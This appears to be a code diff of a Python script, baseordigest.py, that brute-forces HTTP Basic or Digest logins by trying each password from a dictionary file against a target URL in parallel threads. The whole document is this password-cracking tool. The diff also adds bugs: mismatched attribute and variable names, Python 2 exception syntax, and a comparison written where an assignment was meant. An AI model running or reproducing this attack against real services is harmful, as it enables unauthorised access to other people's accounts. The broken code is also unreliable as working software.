@@ -5,10 +5,10 @@ from threading import Thread
 import sys
 import time
 import getopt
-from request.auth import HTTPDigestAuth
+from requests.auth import HTTPDigestAuth
 
 global hit
-hit = "1"
+hit = "1" 
 
 def banner():
     print("""
@@ -17,6 +17,17 @@ def banner():
             **********************************
     """)
 
+
+def usage():
+    print("Usage: ")
+    print("    -w: url (http://example.com)")
+    print("    -u: username")
+    print("    -t: threads")
+    print("    -f: dictionary file")
+    print("    -m: method (basic or digest)")
+    print("Example: baseordigest.py -w http://randomwebsite -u admin -t 5 -f passwords.txt")
+
+
 class request_performer(Thread):
     def __init__(self, passwd, user, url, method):
         Thread.__init__(self)
@@ -24,22 +35,23 @@ class request_performer(Thread):
         self.username = user
         self.url = url
         self.method = method
-        print("-" + self.passwd + "-")
+        print("-" + self.password + "-")
+        
 
     def run(self):
         global hit
         if hit == "1":
             try:
                 if self.method == "basic":
-                    r = requests.get(self.url, auth=(self.username, self.passwd))
+                    r = requests.get(self.url, auth=(self.username, self.password))
                 elif self.method == "digest":
-                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.passwd))
+                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
                 if r.status_code == 200:
                     hit == "0"
-                    print("[+] Password found "+ self.passwd)
+                    print("[+] Password found "+ self.password)
                     sys.exit()
                 else:
-                    print("[!!] No valid password "+ self.passwd)
+                    print("[!!] No valid password "+ self.password)
                     i[0] = i[0]-1
 
             except Exception, e:
@@ -56,19 +68,20 @@ def start(argv):
     except getopt.GetoptError:
         print("[!!] Error on arguments!")
         sys.exit()
-    !for opt, arg in opts:
+    method = "basic"
+    for opt, arg in opts:
         if opt == "-u":
             user = arg
         elif opt == "-w":
             url =arg
         elif opt == "-f":
-            dictionary = arg
+            file = arg
         elif opt == "-m":
             method = arg
         elif opt == "-t":
             threads = arg
     try:
-        f = open(dictionary, "r")
+        f = open(file, "r")
         passwords = f.readlines()
     except:
         print("[!!] File does not exist, please check the path")
@@ -76,7 +89,7 @@ def start(argv):
 
     launcher_threads(passwords, threads, user, url, method)
 
-def launcher_threads(passwords, threads, user, url, method):
+def launcher_threads(passwords, th, username, url, method):
     global i
     i = []
     i.append(0)
@@ -88,8 +101,15 @@ def launcher_threads(passwords, threads, user, url, method):
                     i[0] = i[0] + 1
                     thread = request_performer(passwd, username, url, method)
                     thread.start()
-            except keyboardInterrupt:
+            except KeyboardInterrupt:
                 print("[!!] Interrupted!!")
                 sys.exit()
             thread.join()
+
+if __name__ == "__main__":
+    try:
+        start(sys.argv[1:])
+    except KeyboardInterrupt:
+        print ("[!!] Interrupted")
+        
 
